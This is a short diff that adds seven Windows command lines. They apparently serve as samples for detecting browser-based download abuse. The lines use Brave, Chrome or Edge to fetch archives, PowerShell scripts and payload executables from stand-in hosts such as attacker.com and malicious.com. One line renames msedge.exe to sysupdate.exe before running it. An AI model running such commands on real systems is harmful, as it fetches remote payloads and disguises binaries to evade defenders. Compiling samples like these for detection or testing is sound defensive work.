@@ -1,0 +1,7 @@
+brave.exe http://attacker.com/archive.zip
+chrome.exe "httevil.com/script.ps1?token=12345"
+chrome.exe http://malicious.com/payload.exe?token=123
+cmd.exe /c copy "msedge.exe" sysupdate.exe && sysupdate.exe http://example.com/payload.exe
+msedge.exe "http://example.com/payload.exe"
+msedge.exe http://example.com/payload.exe
+msedge.exe http://example.com/payload.exe --window-size=800,600
